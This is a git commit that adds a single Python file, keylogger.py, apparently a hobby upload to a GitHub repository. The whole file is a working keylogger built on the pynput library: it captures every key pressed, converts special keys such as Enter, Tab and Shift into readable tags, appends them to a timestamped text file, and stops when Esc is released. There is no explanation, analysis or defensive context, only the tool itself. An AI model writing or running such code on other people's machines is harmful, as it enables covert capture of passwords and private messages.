d6141b73aa0f64d44603186e41ca65b48a16919d
Lydia-l-YU <71059872+Lydia-l-YU@users.noreply.github.com>
2021-11-19 23:07:43 -0800

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,50 @@
+from pynput.keyboard import Key, Listener
+import time
+
+date = "keyloggeroutput"
+date += time.strftime("%Y%m%d.%H%M%S") + ".txt" 
+x = time.ctime()
+with open(date, "w") as f:
+    f.write("[" + x + "]: " )
+    
+count = 0
+keys = []
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    if count >= 2:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open(date, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k == "Key.enter":
+                f.write('\n')
+            elif k == "Key.space":
+                f.write(' ')            
+            elif k == "Key.caps_lock":
+                f.write('<capslock>')            
+            elif k == "Key.backspace":
+                f.write('<backspace>')            
+            elif k == "Key.tab":
+                f.write('<tab>')            
+            elif k == "Key.shift_r":
+                f.write('<Rshift>')            
+            elif k == "Key.shift":
+                f.write('<Lshift>')            
+            elif k == "Key.esc":
+                f.write('<esc>')
+            else:
+                f.write(k)
+    
+def on_release(key):
+    if key == Key.esc:
+        return False
+ 
+with Listener(on_press=on_press, on_release=on_release) as listener :
+    listener.join()
+
